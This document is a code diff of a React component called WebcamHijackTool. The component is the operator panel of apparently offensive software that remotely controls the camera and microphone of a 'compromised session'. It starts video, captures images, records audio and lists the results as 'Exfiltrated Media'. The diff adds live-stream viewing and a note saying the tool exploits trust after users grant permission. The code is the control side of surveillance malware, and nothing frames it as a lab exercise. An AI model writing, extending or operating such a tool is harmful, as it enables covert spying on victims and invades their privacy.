@@ -2,10 +2,10 @@
 'use client';
 
 import { useState, useRef, useEffect } from 'react';
-import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
+import { Card, CardHeader, CardTitle, CardDescription, CardContent } from '@/components/ui/card';
 import { Button } from '@/components/ui/button';
 import { useToast } from '@/hooks/use-toast';
-import { Camera, Video, Mic, StopCircle, Download, Loader2, Image as ImageIcon, Save } from 'lucide-react';
+import { Camera, Video, Mic, StopCircle, Download, Image as ImageIcon, Save, Info } from 'lucide-react';
 import { logActivity } from '@/services/activity-log-service';
 import { useAuth } from '@/hooks/use-auth';
 import { Badge } from './ui/badge';
@@ -46,21 +46,28 @@ export function WebcamHijackTool({ sessions, selectedSessionId, setSelectedSessi
     const handleMessage = (event: MessageEvent) => {
         if (event.data.type === 'media-stream' && event.data.sessionId === selectedSessionId) {
             const { data } = event.data;
-            const blob = new Blob([new Uint8Array(data.chunk)], { type: data.type });
-            
-            const newChunk: MediaChunk = {
-                id: `media-${Date.now()}`,
-                blob: blob,
-                type: data.type.startsWith('video') ? 'video' : 'audio',
-                timestamp: new Date().toISOString()
-            };
-            setCapturedMedia(prev => [newChunk, ...prev]);
+            if (data.stream) {
+                 if (videoRef.current) {
+                    videoRef.current.srcObject = data.stream;
+                 }
+            } else {
+                const blob = new Blob([new Uint8Array(data.chunk)], { type: data.type });
+                
+                const newChunk: MediaChunk = {
+                    id: `media-${Date.now()}`,
+                    blob: blob,
+                    type: data.type.startsWith('video') ? 'video' : data.type.startsWith('image') ? 'image' : 'audio',
+                    timestamp: new Date().toISOString()
+                };
+                setCapturedMedia(prev => [newChunk, ...prev]);
+            }
         }
     };
     
     channelRef.current.addEventListener('message', handleMessage);
 
     return () => {
+      channelRef.current?.removeEventListener('message', handleMessage);
       channelRef.current?.close();
     };
   }, [selectedSessionId]);
@@ -101,7 +108,7 @@ export function WebcamHijackTool({ sessions, selectedSessionId, setSelectedSessi
       <CardHeader>
         <div className="flex items-center gap-3">
             <Camera className="h-6 w-6" />
-            <CardTitle>Webcam & Mic Hijacking Toolkit</CardTitle>
+            <CardTitle>Webcam &amp; Mic Hijacking Toolkit</CardTitle>
         </div>
         <CardDescription>Remotely control the camera and microphone of a compromised session.</CardDescription>
       </CardHeader>
@@ -131,7 +138,7 @@ export function WebcamHijackTool({ sessions, selectedSessionId, setSelectedSessi
                         <Button onClick={() => sendCommandToSession('start-video')} disabled={!hasActiveSession}>Start Camera</Button>
                         <Button onClick={() => sendCommandToSession('capture-image')} disabled={!hasActiveSession}>Capture Image</Button>
                         <Button onClick={() => { sendCommandToSession('start-video-record'); setIsRecordingVideo(true); }} disabled={!hasActiveSession || isRecordingVideo}>Start Recording</Button>
-                        <Button onClick={() => { sendCommandToSession('stop-video-record'); setIsRecordingVideo(false); }} disabled={!hasActiveSession || !isRecordingVideo}>Stop Recording</Button>
+                        <Button onClick={() => { sendCommandToSession('stop-video-record'); setIsRecordingVideo(false); }} disabled={!hasActiveSession || !isRecordingVideo} variant="destructive">Stop Recording</Button>
                     </div>
                 </CardContent>
             </Card>
@@ -142,7 +149,16 @@ export function WebcamHijackTool({ sessions, selectedSessionId, setSelectedSessi
                 </CardHeader>
                 <CardContent className="grid grid-cols-2 gap-4">
                      <Button onClick={() => { sendCommandToSession('start-audio-record'); setIsRecordingAudio(true); }} disabled={!hasActiveSession || isRecordingAudio}>Start Recording</Button>
-                     <Button onClick={() => { sendCommandToSession('stop-audio-record'); setIsRecordingAudio(false); }} disabled={!hasActiveSession || !isRecordingAudio}>Stop Recording</Button>
+                     <Button onClick={() => { sendCommandToSession('stop-audio-record'); setIsRecordingAudio(false); }} disabled={!hasActiveSession || !isRecordingAudio} variant="destructive">Stop Recording</Button>
+                </CardContent>
+            </Card>
+             <Card className="border-amber-400/50 bg-amber-400/10">
+                <CardHeader className="flex flex-row items-center gap-3 space-y-0">
+                    <Info className="h-5 w-5 text-amber-400" />
+                    <CardTitle className="text-amber-400 text-base">Security Note</CardTitle>
+                </CardHeader>
+                <CardContent className="text-sm text-amber-400/80">
+                    It is not possible to access a device's camera without activating the hardware indicator light. This is a security feature at the OS level. This toolkit demonstrates exploiting user trust after they grant permission, not bypassing the light itself.
                 </CardContent>
             </Card>
         </div>
@@ -151,7 +167,7 @@ export function WebcamHijackTool({ sessions, selectedSessionId, setSelectedSessi
             <h3 className="font-semibold text-lg">Exfiltrated Media</h3>
             <Card className="h-full flex flex-col min-h-[400px]">
                 <CardContent className="p-2 flex-grow">
-                    <ScrollArea className="h-full max-h-[450px]">
+                    <ScrollArea className="h-full max-h-[600px]">
                         <div className="p-4">
                          {capturedMedia.length === 0 ? (
                             <p className="text-center text-muted-foreground py-16">No media captured yet.</p>
